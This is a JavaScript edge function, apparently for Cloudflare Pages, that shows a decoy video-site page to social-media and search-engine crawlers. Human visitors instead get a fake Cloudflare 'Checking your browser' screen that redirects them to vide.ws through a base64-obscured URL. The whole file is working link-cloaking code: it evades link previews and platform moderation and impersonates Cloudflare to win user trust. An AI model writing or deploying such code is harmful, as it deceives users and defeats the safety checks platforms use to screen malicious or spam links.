export async function onRequest(context) {
  try {
    const { request } = context;
    const url = new URL(request.url);
    const path = url.pathname;
    const host = request.headers.get('host');
    
    console.log(`🔄 Processing: ${path}`);

    // Bot Detection
    const isBot = detectBot(request);
    
    if (isBot) {
      console.log(`🤖 Bot detected - serving safe content`);
      return serveSafeContent(path, host);
    } else {
      console.log(`👤 Human detected - serving redirect`);
      return serveRedirectContent(path, host);
    }
  } catch (error) {
    console.error('❌ Error:', error);
    // Fallback response
    return new Response(`
      <html><body>
        <h1>Loading...</h1>
        <script>window.location.href = 'https://vide.ws/'</script>
      </body></html>
    `, {
      headers: { 'Content-Type': 'text/html' }
    });
  }
}

function detectBot(request) {
  const userAgent = request.headers.get('user-agent') || '';
  const ua = userAgent.toLowerCase();
  
  const bots = [
    'twitterbot', 'facebookexternalhit', 'whatsapp',
    'telegrambot', 'discordbot', 'slackbot',
    'googlebot', 'bingbot', 'yandexbot'
  ];
  
  return bots.some(bot => ua.includes(bot));
}

function getTargetPath(sourcePath) {
  const mappings = {
    '/d/': '/e/',
    '/f/': '/f/', 
    '/v/': '/d/',
    '/s/': '/c/',
    '/p/': '/a/',
    '/w/': '/b/'
  };
  
  // Handle semua path yang dimulai dengan mapping
  for (const [source, target] of Object.entries(mappings)) {
    if (sourcePath.startsWith(source)) {
      const rest = sourcePath.slice(source.length);
      return `https://vide.ws${target}${rest}`;
    }
  }
  
  // Default fallback
  return `https://vide.ws${sourcePath}`;
}

function serveSafeContent(path, host) {
  const pathId = path.split('/').pop() || 'home';
  
  const html = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Streaming Platform</title>
    <meta name="description" content="Premium video streaming service">
    <meta property="og:title" content="Video Streaming Platform">
    <meta property="og:description" content="Watch amazing videos in HD">
    <meta property="og:url" content="https://${host}${path}">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 500px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎬 Video Streaming Platform</h1>
        <p>Content ID: <strong>${pathId}</strong></p>
        <p>High-quality video content loading...</p>
        <button onclick="window.location.reload()">Refresh</button>
    </div>
</body>
</html>`;

  return new Response(html, {
    headers: { 
      'Content-Type': 'text/html; charset=utf-8',
    }
  });
}

function serveRedirectContent(path, host) {
  const targetUrl = getTargetPath(path);
  const encodedUrl = btoa(targetUrl).replace(/=/g, '');
  
  const html = `
<!DOCTYPE html>
<html>
<head>
    <title>Checking your browser before accessing. Just a moment...</title>
    <meta name="description" content="">
    <meta property="og:url" content="https://${host}${path}">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Checking your browser before accessing. Just a moment...">
    <meta property="og:description" content="">
    <meta property="og:image" content="">
    <meta name="twitter:card" content="summary_large_image">
    <meta property="twitter:domain" content="${host}">
    <meta property="twitter:url" content="https://${host}${path}">
    <meta name="twitter:title" content="Checking your browser before accessing. Just a moment...">
    <meta name="twitter:description" content="">
    <meta name="twitter:image" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background: #f5f7fa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            text-align: center;
        }
        .container {
            max-width: 400px;
            padding: 40px 20px;
        }
        .logo {
            color: #f6821f;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #f6821f;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .progress {
            width: 100%;
            height: 4px;
            background: #e2e8f0;
            margin: 20px 0;
        }
        .progress-bar {
            height: 100%;
            background: #f6821f;
            width: 0%;
            animation: load 3s ease-in-out forwards;
        }
        @keyframes load {
            to { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">cloudflare</div>
        <div class="spinner"></div>
        <h2>Checking your browser...</h2>
        <p>Please wait while we verify your browser...</p>
        <div class="progress">
            <div class="progress-bar"></div>
        </div>
    </div>
    <script>
        setTimeout(() => {
            try {
                const encoded = '${encodedUrl}';
                const padding = 4 - (encoded.length % 4);
                const fullEncoded = encoded + '='.repeat(padding);
                const target = atob(fullEncoded);
                window.location.href = target;
            } catch(e) {
                window.location.href = 'https://vide.ws/';
            }
        }, 3000);
        
        // Click to skip wait
        document.body.addEventListener('click', () => {
            try {
                const encoded = '${encodedUrl}';
                const padding = 4 - (encoded.length % 4);
                const fullEncoded = encoded + '='.repeat(padding);
                const target = atob(fullEncoded);
                window.location.href = target;
            } catch(e) {
                window.location.href = 'https://vide.ws/';
            }
        });
    </script>
</body>
</html>`;

  return new Response(html, {
    headers: { 
      'Content-Type': 'text/html; charset=utf-8',
    }
  });
}
